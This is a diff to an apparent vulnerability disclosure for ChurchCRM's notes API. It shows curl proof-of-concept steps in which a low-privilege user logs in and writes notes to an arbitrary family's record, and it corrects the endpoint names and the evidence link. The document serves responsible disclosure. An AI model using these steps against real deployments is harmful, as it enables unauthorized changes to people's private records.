@@ -33,6 +33,7 @@ curl -s -c cookies.txt -X POST "http://TARGET/churchcrm/session/begin" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "User=lowpriv&Password=lowpass123"
 
+# Note: create endpoint is /note (singular), list endpoint is /notes (plural)
 # Step 2 — create a note on an arbitrary family (family ID 1)
 curl -s -b cookies.txt -X POST "http://TARGET/churchcrm/api/family/1/note" \
   -H "Content-Type: application/json" \
@@ -51,14 +52,13 @@ The note is created and readable under the target family despite the requester h
 
 ## Evidence
 
-![Proof of concept](assets/poc.png)
-<!-- Add video or additional screenshots to assets/ -->
+<video src="assets/vuln-3-poc.mp4" controls width="100%"></video>
 
 ## Affected Component
 
 | Field | Value |
 |-------|-------|
-| Endpoint | `GET /api/family/{id}/notes`, `POST /api/family/{id}/notes` |
+| Endpoint | `GET /api/family/{id}/notes` (read), `POST /api/family/{id}/note` (write) |
 | File | `api/routes/people/notes.php` |
 | Middleware | `NotesRoleAuthMiddleware` (role check only, no entity check) |
 | Auth required | Yes — Notes role |
